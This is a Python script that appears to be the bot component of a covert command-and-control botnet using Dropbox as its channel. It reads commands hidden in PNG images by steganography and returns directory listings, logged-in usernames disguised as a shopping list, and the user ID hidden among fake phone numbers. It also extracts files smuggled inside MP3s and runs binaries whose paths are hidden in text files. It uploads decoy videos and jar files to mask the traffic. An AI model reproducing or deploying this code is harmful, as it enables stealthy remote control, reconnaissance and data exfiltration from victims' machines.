import random
import re
import sys

from utils.other import username_chars_shopping_list, AUDIO_DELIMITER, CONTENT_DELIMITER
from utils.system_commands import *
from utils.dropbox_session import DropboxSession, get_nth_bot_dir
from stegano import lsb

COUNTER = 0
NUMBER_OF_FILES = 5


def recover_hidden_message(input_file_path, message_length, interval=100):
    with open(input_file_path, 'r') as file:
        content = file.read()
    hidden_message = ""
    ctr = 0
    for i in range(interval, (message_length + 1) * interval, interval):
        if i < len(content):
            hidden_message += content[i + ctr]
        ctr = ctr + 1
    return hidden_message


def encode_usernames_to_shopping_list(usernames, char_to_item_map, delimiter='-----'):
    shopping_list = []
    for username in usernames:
        for char in username.lower():
            if char in char_to_item_map:
                shopping_list.append(char_to_item_map[char])
            else:
                print(f"Warning: Character '{char}' not in mapping dictionary.")
        shopping_list.append(delimiter)  # Add delimiter after each username
    return ', '.join(shopping_list)


def encode_uid_to_phone_number(uid):
    area_code = random.randint(200, 999)
    exchange_code = random.randint(100, 999)
    subscriber_number = 1000 + (uid % 9000)
    phone_number = f"+1-{area_code}-{exchange_code}-{subscriber_number}"
    return phone_number


def generate_phone_number():
    area_code = random.randint(200, 999)
    exchange_code = random.randint(100, 999)
    subscriber_number = random.randint(1000, 9999)
    phone_number = f"+1-{area_code}-{exchange_code}-{subscriber_number}"
    return phone_number


def encode_id_into_phone_numbers_file(uid):
    str = ""
    for i in range(68):
        str += generate_phone_number() + "\n"
    str += encode_uid_to_phone_number(uid) + "\n"
    for i in range(100 - 69):
        str += generate_phone_number() + "\n"
    write_file("./temp/phone_numbers.txt", str)


def extract_length_from_filename(filename):
    """
    Extracts the length (a number) embedded in the filename before the '.txt' extension.

    :param filename: The filename with a number before the '.txt' extension
    :return: The extracted number as an integer, or None if not found
    """
    match = re.search(r'(\d+)\.txt$', filename)
    if match:
        return int(match.group(1))
    else:
        return None


def extract_file_with_name_from_audio(combined_file_path, output_directory):
    with open(combined_file_path, 'rb') as file:
        content = file.read()

    audio_delimiter_index = content.find(AUDIO_DELIMITER)
    if audio_delimiter_index == -1:
        print("Audio delimiter not found. Cannot extract the file.")
        return

    content_start = audio_delimiter_index + len(AUDIO_DELIMITER)
    content_delimiter_index = content.find(CONTENT_DELIMITER, content_start)
    if content_delimiter_index == -1:
        print("Content delimiter not found. Cannot extract the file.")
        return

    file_name = content[content_start:content_delimiter_index].decode()
    file_data = content[content_delimiter_index + len(CONTENT_DELIMITER):]

    if not file_data:
        print("No data found after the content delimiter.")
        return

    with open(os.path.join(output_directory, file_name), 'wb') as output_file:
        output_file.write(file_data)
        print(f"File extracted to {os.path.join(output_directory, file_name)}")


def preparation(dropbox_session: DropboxSession, my_folder_path: str):
    # Create the bot directory
    dropbox_session.create_directory(my_folder_path)
    # Prepare shopping list
    write_file('./temp/shopping_list.txt',
               encode_usernames_to_shopping_list(['your_mom', 'crazy'], username_chars_shopping_list))
    dropbox_session.upload_file('./temp/shopping_list.txt', my_folder_path + "/shopping_list.txt")
    # Prepare phone numbers
    encode_id_into_phone_numbers_file(11)
    dropbox_session.upload_file("./temp/phone_numbers.txt", my_folder_path + "/phone_numbers.txt")


def cleanup(dropbox_session, my_folder_path: str):
    print("Cleanup")
    dropbox_session.delete_file(my_folder_path)
    delete_contents_of_folder("temp")


def main():
    global COUNTER
    bot_number = int(sys.argv[1])
    print("====== Bot " + str(bot_number) + " ======", flush=True)
    MY_FOLDER_PATH = get_nth_bot_dir(bot_number)

    DROPBOX_ACCESS_TOKEN = sys.argv[2]
    dropbox_session = DropboxSession(DROPBOX_ACCESS_TOKEN)

    cleanup(dropbox_session, MY_FOLDER_PATH)
    preparation(dropbox_session, MY_FOLDER_PATH)
    while True:
        if COUNTER != 0 and COUNTER % NUMBER_OF_FILES == 0:
            print("Cleaning up")
            dropbox_session.delete_file(MY_FOLDER_PATH)
            dropbox_session.create_directory(MY_FOLDER_PATH)
        new_file_names = dropbox_session.wait_for_new_file(folder_path=MY_FOLDER_PATH, check_interval=1)
        for new_file_name in new_file_names:
            if new_file_name.endswith("png"):
                # Read ls command from the picture
                dropbox_session.download_file(f'{MY_FOLDER_PATH}/{new_file_name}', './temp/png_encoded.png')
                ls_command = lsb.reveal("./temp/png_encoded.png")
                # Get the ls result
                ls_result = get_files(ls_command)
                # Save the ls result into a picture
                lsb.hide("./photos/lion.png", str(ls_result)).save("./temp/lion_encoded.png")
                # Upload the encoded file into dropbox
                dropbox_session.upload_file("./temp/lion_encoded.png", MY_FOLDER_PATH + "/lion.png")
            if new_file_name.endswith('.pdf'):
                # Find logged users
                logged_users = get_logged_users()
                # Encode the usernames into a fake shopping list
                shopping_list = encode_usernames_to_shopping_list(logged_users, username_chars_shopping_list)
                # Put the shopping list into a text file
                write_file('./temp/shopping_list.txt', shopping_list)
                # Upload the file
                dropbox_session.upload_file("./temp/shopping_list.txt", MY_FOLDER_PATH + "/shopping_list.txt")
                # Upload a random video to indicate that the response is ready
                random_video_file = get_nth_file("./videos", COUNTER % NUMBER_OF_FILES)
                dropbox_session.upload_file(f'./videos/{random_video_file}', MY_FOLDER_PATH + "/" + random_video_file)
                COUNTER = COUNTER + 1
            if new_file_name.endswith('.docx'):
                # Find the uid
                uid = get_user_id()
                # Create a file with phone numbers
                encode_id_into_phone_numbers_file(uid)
                dropbox_session.upload_file("./temp/phone_numbers.txt", MY_FOLDER_PATH + "/phone_numbers.txt")
                # Upload a random jar file to indicate that the response is ready
                random_jar_file = get_nth_file("./jars", COUNTER % NUMBER_OF_FILES)
                dropbox_session.upload_file(f'./jars/{random_jar_file}', MY_FOLDER_PATH + "/" + random_jar_file)
                COUNTER = COUNTER + 1
            if new_file_name.endswith('.mp3'):
                # Download the file
                dropbox_session.download_file(MY_FOLDER_PATH + f"/{new_file_name}", "./temp/mp3_file.mp3")
                # Extract file from the mp3
                extract_file_with_name_from_audio("./temp/mp3_file.mp3", "./temp")
            if new_file_name.endswith('.txt'):
                # download the file
                dropbox_session.download_file(MY_FOLDER_PATH + f"/{new_file_name}", "./temp/txt_file.txt")
                path_length = extract_length_from_filename(new_file_name)
                path_to_file = recover_hidden_message("./temp/txt_file.txt", path_length)
                try:
                    result = run_binary(path_to_file)
                    print(result)
                except Exception as e:
                    print(e)

if __name__ == '__main__':
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    main()
